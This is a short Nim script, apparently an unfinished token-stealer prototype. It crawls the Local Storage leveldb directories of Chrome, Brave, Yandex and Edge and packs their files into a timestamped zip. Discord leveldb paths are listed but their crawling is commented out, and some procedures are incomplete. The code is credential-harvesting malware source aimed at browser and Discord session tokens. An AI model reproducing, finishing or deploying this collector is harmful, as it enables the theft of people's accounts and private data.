import os
import zip/zipfiles
import times

var z: ZipArchive

type
    BrowserDir = array[5, string]
    DiscDir = array[3, string]

let browserDirectories: BrowserDir = [
    "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
    "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
    "\\Yandex\\YandexBrowser\\User Data\\Default",
    "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\",
    "testdir/"
    ]
    #"\\Opera Software\\Opera Stable\\"
    #]
let discordDirectories: DiscDir = [
    "\\Discord\\Local Storage\\leveldb\\",
    "\\discordptb\\Local Storage\\leveldb\\",
    "\\discordcanary\\Local Storage\\leveldb\\"
]

proc currentTime(): string =
    let timenow = getTime()
    return format(timenow, "yyyymmdd-HHMMss")

let 
    timestamp = "results_" & currentTime() & ".zip"
#    archive = z.open(timestamp, fmWrite)


proc levelDBfinder() =
    var z: ZipArchive
    if not z.open(timestamp, fmWrite):
        quit(1)
    #proc addtoZip(zipFile: string, path: string) =    
    #    z.addFile(zipFile, path)
    proc collectFiles(x: string): string =
        for i in walkDir(x):
            if i.kind == pcFile:
                echo i
                z.addFile(timestamp, $i.path)

    proc findRelevantPath(x: string): string =
        var g=""
        if os.dirExists(x):
            for e in walkDir(x):
                if e.kind == pcDir:
                    g.add(findRelevantPath($e.path))
                else:
                    return collectFiles(x)
                    #for f in walkDir(x):
                    #    if f.kind == pcFile:
                    #        z.addFile(timestamp, $f.path)
        discard g
    

    proc fileCrawlerUno(x: string): string =
        #let path = "LOCALAPPDATA" & x
        let path = x
        if os.dirExists(path):
            findRelevantPath(path)
        else:
            return

#    proc fileCrawlerDos(x: string): string =
#        let path = "APPDATA" & x
#        if os.dirExists(path):
#            findRelevant(path)
#        else:
#            return

    for i in browserDirectories:
        let result = fileCrawlerUno(i)
        #echo result
#    for i in discordDirectories:
#        let result = fileCrawlerDos(i)
#        echo result
    z.close()
levelDBfinder()